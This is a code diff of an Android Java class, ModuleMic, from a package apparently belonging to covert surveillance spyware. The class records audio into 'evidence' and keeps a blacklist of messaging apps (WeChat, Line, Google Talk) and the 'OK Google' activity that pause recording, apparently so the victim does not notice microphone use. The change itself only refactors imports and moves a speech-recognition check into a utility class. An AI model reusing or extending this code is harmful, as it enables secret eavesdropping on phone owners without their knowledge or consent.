@@ -10,18 +10,13 @@
 package com.android.dvci.module;
 
 import android.content.Context;
-import android.content.Intent;
-import android.content.pm.PackageManager;
 import android.media.AudioManager;
 import android.media.MediaRecorder;
 import android.media.MediaRecorder.OnErrorListener;
 import android.media.MediaRecorder.OnInfoListener;
 import android.os.PowerManager;
-import android.speech.RecognizerIntent;
 
-import com.android.dvci.Call;
 import com.android.dvci.ProcessInfo;
-import com.android.dvci.ProcessStatus;
 import com.android.dvci.Standby;
 import com.android.dvci.StateRun;
 import com.android.dvci.Status;
@@ -31,21 +26,21 @@ import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
 import com.android.dvci.file.AutoFile;
 import com.android.dvci.file.Path;
+import com.android.dvci.interfaces.IProcessObserver;
 import com.android.dvci.interfaces.Observer;
-import com.android.dvci.listener.ListenerCall;
 import com.android.dvci.listener.ListenerProcess;
 import com.android.dvci.listener.ListenerStandby;
 import com.android.dvci.manager.ManagerModule;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.DataBuffer;
+import com.android.dvci.util.Utils;
 import com.android.mm.M;
 
 import java.io.File;
 import java.io.FilenameFilter;
 import java.io.IOException;
 import java.util.HashSet;
-import java.util.List;
 import java.util.Set;
 
 /**
@@ -54,7 +49,7 @@ import java.util.Set;
  * @author zeno
  * @ref: http://developer.android.com/reference/android/media/MediaRecorder.html
  */
-public abstract class ModuleMic extends BaseModule implements  OnErrorListener, OnInfoListener {
+public abstract class ModuleMic extends BaseModule implements  OnErrorListener, OnInfoListener, IProcessObserver {
 
 	private static final String TAG = "ModuleMic"; //$NON-NLS-1$
 	private static final String STOP_REASON_PROCESS = "BLACKLISTED_PROCESS"; //$NON-NLS-1$
@@ -106,7 +101,7 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		addBlacklist(M.e("com.tencent.mm"));
 		addBlacklist(M.e("jp.naver.line.android"));
 		addBlacklist(M.e("com.google.android.talk"));
-		if (isSpeechRecognitionActivityPresented()) {
+		if (Utils.isSpeechRecognitionActivityPresent()) {
 			addBlacklist(Status.OK_GOOGLE_ACTIVITY);
 		} else {
 			if (Cfg.DEBUG) {
@@ -115,27 +110,6 @@ public abstract class ModuleMic extends BaseModule implements  OnErrorListener, 
 		}
 	}
 
-	/**
-     * Checks availability of speech recognizing Activity
-     *
-     * @return true – if Activity there available, false – if Activity is absent
-     */
-    private static boolean isSpeechRecognitionActivityPresented() {
-        try {
-            // getting an instance of package manager
-            PackageManager pm = Status.getAppContext().getPackageManager();
-            // a list of activities, which can process speech recognition Intent
-            List activities = pm.queryIntentActivities(new Intent(RecognizerIntent.ACTION_RECOGNIZE_SPEECH), 0);
-
-            if (activities.size() != 0) {    // if list not empty
-                return true;                // then we can recognize the speech
-            }
-        } catch (Exception e) {
-
-        }
-
-        return false; // we have no activities to recognize the speech
-    }
 	public synchronized void addBlacklist(String black) {
 		blacklist.add(black);
 	}
